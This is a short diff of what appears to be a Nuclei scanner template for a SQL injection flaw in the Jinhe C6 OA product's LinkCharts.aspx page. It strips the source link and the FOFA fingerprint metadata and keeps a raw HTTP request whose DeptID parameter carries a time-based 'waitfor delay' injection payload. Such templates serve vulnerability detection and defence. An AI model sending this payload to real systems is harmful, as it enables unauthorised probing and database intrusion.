@@ -3,12 +3,8 @@ info:
   name: 金和网络C6金和OALinkCharts存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/kq3mx3dhgtrti1dy'
+  description: ''
   tags: sqli,2026
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: kq3mx3dhgtrti1dy
-    fofa: app="金和网络-金和OA"
 http:
 - raw:
   - 'GET /c6/JHSoft.Web.CrmWorkFlat/LinkCharts.aspx/?DeptID=1%27waitfor%20delay%270%3A0%3A5%27-- HTTP/1.1
